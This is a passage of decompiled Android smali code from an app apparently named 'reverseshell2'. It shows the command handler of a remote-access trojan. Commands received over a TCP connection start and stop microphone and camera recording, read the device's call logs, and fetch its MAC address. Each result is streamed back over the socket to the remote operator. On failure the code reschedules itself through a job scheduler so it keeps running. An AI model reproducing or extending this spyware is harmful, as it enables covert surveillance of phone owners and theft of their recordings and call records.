    invoke-virtual {v7, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v10

    invoke-virtual {v13, v10}, Ljava/io/OutputStream;->write([B)V

    .line 214
    invoke-virtual {v4, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v4

    invoke-virtual {v13, v4}, Ljava/io/OutputStream;->write([B)V

    .line 215
    .end local v0    # "res":Ljava/lang/String;
    move-object/from16 v10, v17

    move-object/from16 v4, v18

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 216
    :cond_10
    const-string v0, "startAudio"

    invoke-virtual {v12, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_11

    .line 218
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->audioManager:Lcom/example/reverseshell2/Payloads/audioManager;

    invoke-virtual {v0, v13}, Lcom/example/reverseshell2/Payloads/audioManager;->startRecording(Ljava/io/OutputStream;)V

    move-object/from16 v10, v17

    move-object/from16 v4, v18

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 220
    :cond_11
    const-string v0, "stopAudio"

    invoke-virtual {v12, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_12

    .line 222
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->audioManager:Lcom/example/reverseshell2/Payloads/audioManager;

    invoke-virtual {v0, v13}, Lcom/example/reverseshell2/Payloads/audioManager;->stopRecording(Ljava/io/OutputStream;)V

    move-object/from16 v10, v17

    move-object/from16 v4, v18

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 224
    :cond_12
    const-string v0, "startVideo \\d"

    invoke-virtual {v12, v0}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_13

    .line 226
    invoke-virtual {v12, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 227
    .local v0, "cameraid":[Ljava/lang/String;
    iget-object v4, v1, Lcom/example/reverseshell2/tcpConnection;->videoRecorder:Lcom/example/reverseshell2/Payloads/videoRecorder;

    const/4 v10, 0x1

    aget-object v11, v0, v10

    invoke-static {v11}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v11

    invoke-virtual {v4, v11, v13}, Lcom/example/reverseshell2/Payloads/videoRecorder;->startVideo(ILjava/io/OutputStream;)V

    .line 228
    .end local v0    # "cameraid":[Ljava/lang/String;
    move-object/from16 v10, v17

    move-object/from16 v4, v18

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 229
    :cond_13
    const/4 v10, 0x1

    const-string v0, "stopVideo"

    invoke-virtual {v12, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_14

    .line 232
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->videoRecorder:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-virtual {v0, v13}, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoStop(Ljava/io/OutputStream;)V

    move-object/from16 v10, v17

    move-object/from16 v4, v18

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 234
    :cond_14
    const-string v0, "getCallLogs"

    invoke-virtual {v12, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_16

    .line 236
    const-string v0, "callLogs\n"

    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-virtual {v13, v0}, Ljava/io/OutputStream;->write([B)V

    .line 237
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->readCallLogs:Lcom/example/reverseshell2/Payloads/readCallLogs;

    invoke-virtual {v0}, Lcom/example/reverseshell2/Payloads/readCallLogs;->readLogs()Ljava/lang/String;

    move-result-object v0

    .line 238
    .local v0, "call_logs":Ljava/lang/String;
    if-nez v0, :cond_15

    .line 239
    const-string v11, "No call logs found on the device\n"

    invoke-virtual {v11, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v11

    invoke-virtual {v13, v11}, Ljava/io/OutputStream;->write([B)V

    .line 240
    invoke-virtual {v4, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v4

    invoke-virtual {v13, v4}, Ljava/io/OutputStream;->write([B)V

    goto :goto_8

    .line 242
    :cond_15
    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v11

    invoke-virtual {v13, v11}, Ljava/io/OutputStream;->write([B)V

    .line 243
    invoke-virtual {v4, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v4

    invoke-virtual {v13, v4}, Ljava/io/OutputStream;->write([B)V

    .line 246
    .end local v0    # "call_logs":Ljava/lang/String;
    :goto_8
    move-object/from16 v10, v17

    move-object/from16 v4, v18

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 247
    :cond_16
    const-string v0, "getMACAddress"

    invoke-virtual {v12, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_17

    .line 249
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->ipAddr:Lcom/example/reverseshell2/Payloads/ipAddr;

    const/4 v4, 0x0

    invoke-static {v4}, Lcom/example/reverseshell2/Payloads/ipAddr;->getMACAddress(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 250
    .local v0, "macAddress":Ljava/lang/String;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    move-object v0, v4

    .line 251
    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v4

    invoke-virtual {v13, v4}, Ljava/io/OutputStream;->write([B)V

    .line 252
    .end local v0    # "macAddress":Ljava/lang/String;
    move-object/from16 v10, v17

    move-object/from16 v4, v18

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 255
    :cond_17
    const-string v0, "Unknown Command \n"

    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-virtual {v13, v0}, Ljava/io/OutputStream;->write([B)V

    move-object/from16 v10, v17

    move-object/from16 v4, v18

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 258
    .end local v12    # "line":Ljava/lang/String;
    .end local v17    # "welcomeMess":Ljava/lang/String;
    .local v10, "welcomeMess":Ljava/lang/String;
    .restart local v16    # "line":Ljava/lang/String;
    :cond_18
    move-object/from16 v17, v10

    move-object/from16 v12, v16

    .end local v10    # "welcomeMess":Ljava/lang/String;
    .end local v16    # "line":Ljava/lang/String;
    .restart local v12    # "line":Ljava/lang/String;
    .restart local v17    # "welcomeMess":Ljava/lang/String;
    invoke-static {v6, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 259
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x15

    if-lt v0, v2, :cond_19

    .line 260
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    iget-object v2, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    invoke-virtual {v0, v2}, Lcom/example/reverseshell2/functions;->jobScheduler(Landroid/content/Context;)V

    goto :goto_9

    .line 262
    :cond_19
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;

    new-instance v2, Lcom/example/reverseshell2/tcpConnection$4;

    invoke-direct {v2, v1}, Lcom/example/reverseshell2/tcpConnection$4;-><init>(Lcom/example/reverseshell2/tcpConnection;)V

    invoke-virtual {v0, v2}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    .line 288
    .end local v12    # "line":Ljava/lang/String;
    .end local v13    # "out":Ljava/io/OutputStream;
    .end local v14    # "in":Ljava/io/BufferedReader;
    .end local v15    # "model":Ljava/lang/String;
    .end local v17    # "welcomeMess":Ljava/lang/String;
    :goto_9
    goto :goto_b

    .line 88
    :cond_1a
    move-object/from16 v18, v4

    goto/16 :goto_0

    .line 269
    :catch_3
    move-exception v0

    .line 270
    .local v0, "e":Ljava/lang/Exception;
    invoke-static {v6, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 271
    iget-object v2, v1, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;

    new-instance v3, Lcom/example/reverseshell2/tcpConnection$5;

    invoke-direct {v3, v1}, Lcom/example/reverseshell2/tcpConnection$5;-><init>(Lcom/example/reverseshell2/tcpConnection;)V

    invoke-virtual {v2, v3}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 277
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x15

    if-lt v2, v3, :cond_1b

    .line 278
    iget-object v2, v1, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    iget-object v3, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    invoke-virtual {v2, v3}, Lcom/example/reverseshell2/functions;->jobScheduler(Landroid/content/Context;)V

    goto :goto_a

    .line 280
    :cond_1b
    iget-object v2, v1, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;

    new-instance v3, Lcom/example/reverseshell2/tcpConnection$6;

    invoke-direct {v3, v1}, Lcom/example/reverseshell2/tcpConnection$6;-><init>(Lcom/example/reverseshell2/tcpConnection;)V

    invoke-virtual {v2, v3}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 287
    :goto_a
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 289
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_b
    const/4 v2, 0x0

    return-object v2
.end method
